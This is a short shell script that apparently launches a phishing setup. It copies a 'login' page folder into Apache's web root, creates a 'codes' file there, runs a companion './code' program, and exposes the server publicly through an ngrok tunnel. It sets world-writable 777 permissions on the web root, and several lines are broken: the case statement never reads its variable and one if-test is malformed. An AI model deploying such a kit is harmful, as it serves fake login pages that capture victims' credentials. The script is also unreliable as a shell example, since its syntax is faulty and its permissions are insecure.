#!/bin/sh
echo "start apache2 server?(y/n)"
read i
case i in
n)
	echo "ok"
;;
y)
	service apache2 start
;;
esac


ls triger
if $?-eq 0]; then

	cat triger
else
	sudo mkdir /var/www/html/code
	sudo touch /var/www/html/code/codes
	touch triger
fi

sudo cp -r login/* /var/www/html
sudo chmod 777 /var/www/html
sudo chmod 777 /var/www/html/*
sudo chmod 777 /var/www/html/code/*

sudo cp /usr/local/bin/ngrok* ngrok

if [ $?  -eq 0 ]; then
	sudo rm -r ngrok*
	xterm -e ./code &
	ngrok http 80
else 
	echo "please download ngrok(appimage), activate it with your account and copy it to /usr/local/bin directory"
fi
